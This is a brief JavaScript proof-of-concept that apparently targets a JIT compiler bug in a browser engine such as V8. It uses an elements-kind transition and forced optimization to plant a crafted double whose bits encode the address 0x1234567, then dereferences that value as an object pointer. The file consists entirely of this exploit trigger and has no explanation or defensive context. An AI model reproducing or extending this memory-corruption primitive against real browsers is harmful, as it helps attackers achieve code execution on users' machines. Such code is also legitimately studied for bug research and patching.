function opt(a, b) {
    b[0] = 0;

    a.length;

    // TransitionElementsKind
    for (let i = 0; i < 1; i++)
        a[0] = 0;

    b[0] = 9.431092e-317;  // 0x1234567

    // Force optimization
    for (let i = 0; i < 10000000; i++) {

    }
}

let arr1 = new Array(1);
arr1[0] = 'a';
opt(arr1, [0]);

let arr2 = [0.1];
opt(arr2, arr2);

opt(arr2, arr2);
arr2[0].x  // access 0x1234566